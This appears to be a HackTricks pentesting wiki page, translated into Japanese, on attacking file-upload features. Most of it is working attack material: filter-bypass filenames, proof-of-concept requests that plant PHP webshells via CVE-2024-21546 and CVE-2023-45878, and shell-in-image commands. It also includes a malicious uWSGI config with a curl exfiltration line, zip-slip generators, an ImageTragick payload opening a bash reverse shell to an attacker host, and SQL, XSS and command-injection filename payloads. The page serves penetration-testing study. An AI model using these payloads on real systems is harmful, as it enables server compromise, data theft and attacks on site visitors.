# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## ファイルアップロード 一般的な方法論

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 該当する場合は、前述の拡張子を**チェック**してください。また**大文字**を使ってテストしてください: _pHp, .pHP5, .PhAr ..._
2. _実行拡張子の前に**有効な拡張子を追加する**ことをチェックしてください（前述の拡張子も使用）:_
- _file.png.php_
- _file.png.Php5_
3. 末尾に**特殊文字を追加**してみてください。Burpを使ってすべての**ascii**や**Unicode**文字を**bruteforce**することができます。（_注意: **前述の**拡張子を使うことも試せます_）
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバーサイドの拡張子パーサーを**騙す（tricking the extension parser）**ことで保護をバイパスしてみてください。例えば**拡張子を二重にする（doubling）**や拡張子の間に**ジャンク**データ（**null**バイト）を入れるなどのテクニックです。_より良いペイロードを作るために前述の拡張子を使うこともできます。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 前述のチェックに**さらに別の拡張子レイヤー**を追加してみてください:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. 実行用拡張子を有効な拡張子の前に置いて、サーバーが誤設定されていることを祈ってください。（useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
- _ex: file.php.png_
7. **NTFS alternate data stream (ADS)** を **Windows** で利用する方法。禁じられた拡張子の後、許可された拡張子の前にコロン文字 ":" が挿入されます。その結果、サーバー上に**禁じられた拡張子の空ファイル**が作成されます（例: "file.asax:.jpg”）。このファイルはその後、short filename を使うなど別の手法で編集される可能性があります。"**::$data**” パターンを使って非空のファイルを作ることもできます。したがって、このパターンの後にドットを追加することも追加制限のバイパスに有効な場合があります（例: "file.asp::$data.”）
8. ファイル名の上限を超えるようにしてみてください。有効な拡張子が切り捨てられ、悪意あるPHPが残る可能性があります。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

一部のupload handlerは保存時にファイル名の末尾ドットをトリムまたは正規化します。UniSharp の Laravel Filemanager (unisharp/laravel-filemanager) の 2.9.1 未満のバージョンでは、次のようにして拡張子検証をバイパスできます:

- 有効な画像の MIME と magic header を使用する（例: PNG の `\x89PNG\r\n\x1a\n`）。
- アップロードするファイル名を PHP 拡張子の後にドットを付けて命名する（例: `shell.php.`）。
- サーバーが末尾のドットを削除して `shell.php` として保存し、public に公開されるディレクトリ（デフォルトの public storage 例: `/storage/files/`）に配置されれば実行されます。

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
次に保存されたパスにアクセスします（Laravel + LFMで一般的）：
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager を ≥ 2.9.1 にアップグレードする。
- サーバー側で厳格な allowlists を強制し、保存されたファイル名を再検証する。
- アップロードは実行可能でない場所から配信する。

### Bypass Content-Type, Magic Number, Compression & Resizing

- **Content-Type** のチェックをバイパスするには、**Content-Type** **header** の **value** を次のように設定する: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** チェックは、ファイルの先頭に **bytes of a real image** を追加してバイパスできます（_file_ コマンドを混乱させる）。あるいは **metadata** の中にシェルを挿入します:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` またはペイロードを直接画像に**introduce**することもできます:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 画像に圧縮が適用されている場合（例えば [PHP-GD](https://www.php.net/manual/fr/book.image.php) のような標準的な PHP ライブラリを使用している場合）、前述の手法は有効ではありません。しかし、**PLTE chunk** を使用する [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、圧縮を**survive compression**するテキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- ウェブページが例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` を使って画像を **resizing** している場合もあります。しかし、**IDAT chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、圧縮を**survive compression**するテキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 画像のリサイズを生き残るペイロードを作る別の手法として、PHP-GD の `thumbnailImage` を使う方法があります。ただし、**tEXt chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、圧縮に耐えるテキストを挿入できます。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- 既にアップロードされたファイルの拡張子を変更するためにファイルを **rename** できる脆弱性を探す。
- バックドアを実行するための **Local File Inclusion** 脆弱性を探す。
- **Possible Information disclosure**:
1. 同じファイルを**複数回**（かつ**同時に**）同じ名前でアップロードする。
2. 既に存在する**ファイル**や**フォルダ**の**名前**でファイルをアップロードする。
3. 名前を `"."`, `".."`, または `"…"` にしたファイルをアップロードする。例えば、Apache on **Windows** でアプリケーションがアップロードを "/www/uploads/" ディレクトリに保存する場合、"." というファイル名は "/www/" ディレクトリに uploads” というファイルを作成します。
4. **NTFS** 上で **"…:.jpg"** のように簡単に削除できないファイルをアップロードする。（Windows）
5. **Windows** で名前に `|<>*?”` のような **invalid characters** を含むファイルをアップロードする。（Windows）
6. **Windows** で CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9 といった予約（禁止）名を使ってファイルをアップロードする。
- 被害者が誤って開いたときにコードを実行する **.exe** や（より疑わしくない）**.html** のアップロードも試す。

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` ファイルは Java の `.jar` のようなもので、php 用であり、php として実行したりスクリプト内で include したりして **used like a php file** ことができます。

`.inc` 拡張子は、ファイルを **import** するためだけに使われる php ファイルに使われることがあり、結果としてこの拡張子が実行可能になることがあり得ます。

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 脆弱性は、`.ini` 設定ファイルを変更する能力がある場合に uWSGI サーバで悪用され得ます。uWSGI の設定ファイルは "magic" 変数、プレースホルダ、オペレータを組み込むための特定の構文を持ちます。特に '@' オペレータ（`@(filename)` として使われる）はファイルの内容を取り込むよう設計されています。uWSGI がサポートする様々なスキームのうち、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることを可能にします。この機能は、`.ini` 設定ファイルが処理されるときに Remote Command Execution や Arbitrary File Write/Read のような悪意ある目的に悪用され得ます。

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
ペイロードの実行は設定ファイルのパース時に発生します。設定を有効化してパースさせるには、uWSGI プロセスを再起動する必要があります（クラッシュ後や Denial of Service 攻撃による場合があり得ます）、またはファイルを auto-reload に設定する必要があります。auto-reload 機能が有効な場合、変更を検知すると指定間隔でファイルを再読み込みします。

uWSGI の設定ファイルのパースが緩い性質を理解することが重要です。具体的には、ここで扱う payload は image や PDF といった binary ファイルに挿入でき、悪用の範囲がさらに広がります。

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS の認証不要のエンドポイントが web root 内への arbitrary file write を許し、PHP ファイルを配置することで pre-auth RCE に繋がります。脆弱なバージョン: 25.0.01 まで（含む）。

- エンドポイント: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- メソッド: POST
- 必須パラメータ:
- `img`: data-URI のような文字列: `[mime];[name],[base64]` (サーバーは type/name を無視し、末尾を base64 デコードします)
- `path`: Gibbon install dir からの相対の保存先ファイル名（例: `poc.php` または `0xdf.php`）
- `gibbonPersonID`: 空でない任意の値が受け入れられます（例: `0000000001`）

ファイルを書き込み・読み取るための最小 PoC:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
最小限の webshell を設置してコマンドを実行する:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
注意事項:
- ハンドラは `;` と `,` で分割した後に `base64_decode($_POST["img"])` を実行し、拡張子/タイプの検証を行わずにバイト列を `$absolutePath . '/' . $_POST['path']` に書き込みます。
- 結果として実行されるコードは web サービスのユーザとして実行されます（例: XAMPP Apache on Windows）。

このバグに関する参考情報には usd HeroLab advisory と NVD のエントリが含まれます。下の References セクションを参照してください。

## **wget File Upload/SSRF Trick**

場合によっては、サーバが **`wget`** を使って **download files** しており、あなたが **URL** を示すことができる場合があります。このようなケースでは、コードがダウンロードされるファイルの拡張子がホワイトリストに含まれているかをチェックし、許可されたファイルのみがダウンロードされるようにしているかもしれません。しかし、**このチェックは回避可能です。**\
**linux** における **filename** の最大長は **255** ですが、**wget** はファイル名を **236** 文字に切り詰めます。You can **download a file called "A"*232+".php"+".gif"**, このファイル名はホワイトリストの**チェックをバイパス**します（この例では **".gif"** が**valid** な拡張子です）が、`wget` はファイル名を **"A"*232+".php"** に**rename** します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTPサーバ** redirect to a different file, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) は、Pentesters and Bug Hunters が file upload メカニズムをテストするのを支援するために設計された強力なツールです。さまざまな bug bounty テクニックを活用して脆弱性の発見と悪用を簡素化し、web applications の徹底的な評価を支援します。

### Corrupting upload indices with snprintf quirks (historical)

一部のレガシーな upload ハンドラは、`snprintf()` や類似の関数を使って single-file upload から multi-file 配列を構築していますが、これらは `_FILES` 構造を偽造するように騙されることがあります。`snprintf()` の挙動における一貫性の欠如や切り捨てにより、巧妙に作られた single upload がサーバ側で複数のインデックス付きファイルとして見えることがあり、厳密な形状を想定しているロジック（例: multi-file upload として扱い、安全でない分岐に入る）が混乱します。今日ではニッチですが、この “index corruption” パターンは時折 CTFs や古いコードベースで再出現します。

## From File upload to other vulnerabilities

- **filename** に `../../../tmp/lol.png` を設定して **path traversal** を試みる
- **filename** に `sleep(10)-- -.jpg` を設定すると **SQL injection** が達成できる可能性がある
- **filename** に `<svg onload=alert(document.domain)>` を設定して XSS を実現する
- **filename** に `; sleep 10;` を設定して一部のコマンドインジェクションをテストする (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- ファイルをアップロードして **size limit** があるか確認する

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

その他のファイルタイプは [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) を参照してください。

## Zip/Tar File Automatically decompressed Upload

もしサーバ内で展開される ZIP をアップロードできるなら、次の2つができます:

### シンボリックリンク

他のファイルへのシンボリックリンクを含むリンクをアップロードすると、展開後にそのファイルにアクセスすることでリンク先のファイルにアクセスできます:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダに解凍する

解凍中にディレクトリ内にファイルが予期せず作成される問題は重大です。当初、この構成が悪意のあるファイルアップロードによるOSレベルのコマンド実行を防ぐと考えられていても、ZIPアーカイブ形式の階層的な圧縮サポートとディレクトリトラバーサル機能が悪用され得ます。これにより攻撃者は制限を迂回し、ターゲットアプリケーションの解凍機能を操作してセキュアなアップロードディレクトリから脱出できます。

そのようなファイルを作成する自動化エクスプロイトは[**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)。このユーティリティは次のように使用できます:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** はオプションです。目的が `/flag.txt` のようなファイルを狙うことであれば、そのファイルへのシンボリックリンクをシステムに作成しておくべきです。これにより、evilarc は動作中にエラーを起こさなくなります。

以下は、悪意のある zip ファイルを作成するために使われる Python のコード例です：
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮を悪用して file spraying を行う**

詳細については **元の投稿を確認してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: コマンドを `$_REQUEST` 変数経由で受け取り実行する PHP コードが書かれている。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルを作成し、これらを含む zip アーカイブを作成する。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip 内のファイル名を vi または hex editor で変更し、"xxA" を "../" に置換してディレクトリを横断する。

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

この内容を画像の拡張子でアップロードすることで脆弱性を悪用できます **(ImageMagick , 7.0.1-1)**（詳細は [exploit](https://www.exploit-db.com/exploits/39767) を参照）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNGにPHP Shellを埋め込む

PNGファイルのIDATチャンクにPHP Shellを埋め込むことで、特定の画像処理操作を回避できることがあります。PHP-GDの関数 `imagecopyresized` と `imagecopyresampled` は、それぞれ画像のリサイズやリサンプリングに一般的に使われるため、この文脈で特に関連性があります。埋め込まれたPHP Shellがこれらの処理に影響されずに残ることは、特定のユースケースにおいて大きな利点です。

この手法の詳細な検討（方法論や潜在的な応用を含む）は、以下の記事で解説されています: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。このリソースはプロセスとその影響を包括的に理解するのに役立ちます。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot filesは、複数のファイル形式として同時に有効に存在できる“カメレオン”的なツールです。興味深い例としては、GIFとRARのハイブリッドである[GIFAR](https://en.wikipedia.org/wiki/Gifar)があります。こうしたファイルはこの組み合わせに限らず、GIFとJS、PPTとJSなどの組み合わせも可能です。

polyglot filesの主な有用性は、ファイルタイプに基づいてスクリーニングするセキュリティ対策を回避できる点にあります。多くのアプリケーションでは、潜在的に危険なフォーマット（例：JS、PHP、Phar）によるリスクを軽減するために、JPEG、GIF、DOCなどの特定のファイルタイプのみをアップロード許可するという運用が行われます。しかし、polyglotは複数のファイル形式の構造要件を満たすことで、これらの制限を巧妙に回避できます。

とはいえ、polyglotにも制約はあります。たとえば、PHAR（PHp ARchive）とJPEGを同時に兼ねるpolyglotがあったとしても、プラットフォームのファイル拡張子ポリシーによってはアップロードがブロックされる可能性があり、構造上の二重性だけではアップロードが保証されない場合があります。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDFのふりをして有効なJSONをアップロードする方法

許可されていない場合でもPDFを偽装して有効なJSONファイルをアップロードすることでファイルタイプ検出を回避する方法（**[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** の手法）:

- **`mmagic` library**: 最初の1024バイト以内に`%PDF`のマジックバイトがあれば有効と見なされます（例は記事参照）
- **`pdflib` library**: JSONのフィールド内に偽のPDFフォーマットを追加して、ライブラリにPDFだと判断させます（例は記事参照）
- **`file` binary**: ファイルから最大1048576バイトを読み取れます。これより大きなJSONを作成して内容をJSONとして解析できないようにし、そのJSON内に実際のPDFの先頭部分を入れておけば、`file`はそれをPDFだと判断します

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
